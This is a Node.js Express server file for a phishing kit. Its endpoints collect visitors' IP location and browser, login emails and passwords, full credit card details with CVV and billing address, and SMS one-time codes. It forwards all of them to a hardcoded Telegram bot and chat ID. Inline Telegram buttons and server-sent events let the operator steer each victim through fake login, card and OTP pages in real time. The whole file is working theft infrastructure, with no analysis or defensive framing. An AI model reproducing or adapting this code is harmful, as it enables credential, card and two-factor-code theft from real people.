const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const userAgentParser = require('user-agent-parser');

const app = express();
const port = 3000;

const botToken = '7764284417:AAE9-ADJoUIFoXjNuZclwFI8yJOpKRcINMQ';
const chatId = '1690728339';

const bot = new TelegramBot(botToken, { polling: true });

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const sseConnections = {};
app.get('/details', async (req, res) => {
    const visitorIp = (req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',')[0].trim();
    const userAgent = req.headers['user-agent'];
    const userId = req.headers['user-id'];

    if (!userId) {
        return res.status(400).json({ success: false, message: "User ID is required" });
    }

    const parsedUserAgent = userAgentParser(userAgent);
    const browser = parsedUserAgent.browser.name || 'Unknown';

    let visitorCity = 'Unknown';
    let visitorCountry = 'Unknown';
    let visitorProvider = 'Unknown';
    let visitorHostname = 'Unknown';

    try {
        console.log('Fetching IP info for:', visitorIp);
        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
        const ipInfo = ipInfoResponse.data;

        if (ipInfo && ipInfo.status === 'success') {
            visitorCity = ipInfo.city || 'Unknown';
            visitorCountry = ipInfo.country || 'Unknown';
            visitorProvider = ipInfo.org || 'Unknown';
            visitorHostname = ipInfo.hostname || 'Unknown';
        } else {
            console.error('Failed to retrieve IP information:', ipInfo);
        }
    } catch (error) {
        console.error('Error fetching IP information from ip-api:', error);
        // Optional fallback
        try {
            const fallbackResponse = await axios.get(`https://ipinfo.io/${visitorIp}?token=<YOUR_IPINFO_TOKEN>`);
            const fallbackInfo = fallbackResponse.data;
            visitorCity = fallbackInfo.city || 'Unknown';
            visitorCountry = fallbackInfo.country || 'Unknown';
            visitorProvider = fallbackInfo.org || 'Unknown';
            visitorHostname = fallbackInfo.hostname || 'Unknown';
        } catch (fallbackError) {
            console.error('Fallback API also failed:', fallbackError);
        }
    }

			const message = `
		🚨 New Visitor Alert 🚨
		=====================
		🌍 IP Address: ${visitorIp}
		🔗 Hostname: ${visitorHostname}
		🏙 City: ${visitorCity}
		🏳️ Country: ${visitorCountry}
		🌐 Browser: ${browser}
		🛣 Provider: ${visitorProvider}
		🆔 User ID: ${userId}  
		=====================
		`;

    try {
        await sendToTelegram(message, userId);
        res.json({ success: true });
    } catch (error) {
        console.error('Error notifying page load:', error);
        res.status(500).json({ success: false });
    }
});
app.get('/details-approve', async (req, res) => {
    const visitorIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const userId = req.headers['user-id'];
    if (!userId) {
        return res.status(400).json({ success: false, message: "User ID is required" });
    }

    const parsedUserAgent = userAgentParser(userAgent);
    const browser = parsedUserAgent.browser.name;

    let visitorCity = '';
    let visitorCountry = '';
    let visitorProvider = '';

    try {
        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
        const ipInfo = ipInfoResponse.data;

        if (ipInfo && ipInfo.status === 'success') {
            visitorCity = ipInfo.city || 'Unknown';
            visitorCountry = ipInfo.country || 'Unknown';
            visitorProvider = ipInfo.org || 'Unknown';
        }
    } catch (error) {
        console.error('Error fetching IP information:', error);
    }

    const message = `
🚨 User On Approve 🚨
=====================
🌍 IP Address: ${visitorIp}
🏙 City: ${visitorCity}
🏳️ Country: ${visitorCountry}
🌐 Browser: ${browser}
🛣 Provider: ${visitorProvider}
🆔 User ID: ${userId}  
=====================
`;

    try {
        await sendToTelegram(message, userId);
        res.json({ success: true });
    } catch (error) {
        console.error('Error notifying page load:', error);
        res.status(500).json({ success: false });
    }
});
app.get('/user-id', (req, res) => {
    const userId = generateZariNumberId();
    console.log(`Generated user ID: ${userId}`);
    res.json({ success: true, userId });
});

function generateZariNumberId(length = 13) {
    const min = Math.pow(10, length - 1);
    const max = Math.pow(10, length) - 1;
    const randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
    return 'Id' + randomNum;
}

app.post('/login', async (req, res) => {
    const { username, password, userId } = req.body;

    if (!username || !password) {
        return res.status(400).send('Please provide both username and password.');
    }

    const message = `
🚨Login
=====================
🧑‍💻 Email: ${username}
🔑 Password: ${password}
=====================
🌍 User ID: ${userId}
=====================
`;

    try {
        console.log('Sending login message to Telegram...');
        await sendToTelegram(message, userId);
        res.send({
            success: true,
            message: 'Login attempt successful. Please wait for action buttons.',
            showVerification: true,
        });
    } catch (error) {
        console.error('Error sending login message to Telegram:', error);
        res.status(500).send('Internal Server Error');
    }
});

app.post('/send-cc', async (req, res) => {
    const {
        cc_holder,
        cc,
        exp,
        cvv,
        userId,
        addressLine,
        city,
        state,
        zipcode
    } = req.body;

    const message = `
🚨 CC Data
=====================
👤 Name: ${cc_holder}
💳 Card Number: ${cc}
📅 Expiration Date: ${exp}
🔒 CVV: ${cvv}
=====================
🏠 Address: ${addressLine}, ${city}, ${state} ${zipcode}
=====================
🌍 User ID: ${userId}
=====================
`;

    try {
        console.log('Sending CC data to Telegram...');
        await sendToTelegram(message, userId);
        res.send({
            success: true,
            message: 'CC attempt successful. Please wait for action buttons.',
            showVerification: true,
        });
    } catch (error) {
        console.error('Error sending CC message to Telegram:', error);
        res.status(500).send('Internal Server Error');
    }
});


app.post('/send-sms', async (req, res) => {
    const { codeSms, userId } = req.body;

    const message = `
🚨 Sms Code
=====================
🔑 Code: ${codeSms}
=====================
🌍 User ID: ${userId}
=====================
`;

    try {
        console.log('Sending SMS code to Telegram...');
        await sendToTelegram(message, userId);
        res.send({
            success: true,
            message: 'SMS attempt successful. Please wait for action buttons.',
            showVerification: true,
        });
    } catch (error) {
        console.error('Error sending SMS code to Telegram:', error);
        res.status(500).send('Internal Server Error');
    }
});

async function sendToTelegram(message, userId) {
    try {
        console.log(`Sending message to Telegram for userId: ${userId}`);
        await bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Login', callback_data: `login|${userId}` },
                        { text: 'Update', callback_data: `cc|${userId}` },
                    ],
                    [
                        { text: 'Otp', callback_data: `sms|${userId}` },
                        { text: 'Approve', callback_data: `approve|${userId}` },
                    ],
                    [
                        { text: 'Update-Error', callback_data: `updateError|${userId}` },
                        { text: 'Otp-Error', callback_data: `otpError|${userId}` },
                        { text: 'Login-Error', callback_data: `loginError|${userId}` },
                    ],
                    [
                        { text: 'Thankyou', callback_data: `thankyou|${userId}` },
                    ],
                ],
            },
        });
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        throw error;
    }
}

bot.on('callback_query', async (callbackQuery) => {
    const { id, data } = callbackQuery;
    const [action, userId] = data.split('|');

    let responseText = '';
    let showRedirect = false;

    console.log(`Callback received: action=${action}, userId=${userId}`);

    switch (action) {
        case 'login':
            responseText = `User ${userId} clicked Login.`;
            break;
        case 'cc':
            responseText = `User ${userId} clicked CC.`;
            break;
        case 'sms':
            responseText = `User ${userId} clicked SMS.`;
            break;
        case 'otpError':
            responseText = `User ${userId} clicked otpError.`;
            break;
        case 'updateError':
            responseText = `User ${userId} clicked updateError.`;
            break;
        case 'approve':
            responseText = `User ${userId} clicked approve.`;
            break;
        case 'loginError':
            responseText = `User ${userId} clicked loginError.`;
            break;
        case 'thankyou':
            responseText = `User ${userId} clicked thankyou.`;
            break;
        default:
            responseText = `Unknown action for user ${userId}.`;
            break;
    }

    try {

        await bot.answerCallbackQuery(id, { text: responseText });
        console.log(`Answered callback query with text: ${responseText}`);


        if (sseConnections[userId]) {
            console.log(`Sending SSE update for user ${userId}`);
            sseConnections[userId].forEach((client) => {
                client.write(`data: ${JSON.stringify({ action, userId, showRedirect })}\n\n`);
            });
        }
    } catch (error) {
        console.error('Error handling callback query:', error);
    }
});

app.get('/sse/:userId', (req, res) => {
    const { userId } = req.params;
    console.log(`SSE connection started for userId: ${userId}`);

    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    if (!sseConnections[userId]) {
        sseConnections[userId] = [];
    }

    sseConnections[userId].push(res);

    req.on('close', () => {
        console.log(`SSE connection closed for userId: ${userId}`);
        sseConnections[userId] = sseConnections[userId].filter(client => client !== res);
    });
});

app.post('/updateFrontend', (req, res) => {
    const { userId, action } = req.body;
    console.log(`User ${userId}: Action - ${action}`);
    res.send({ success: true });
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
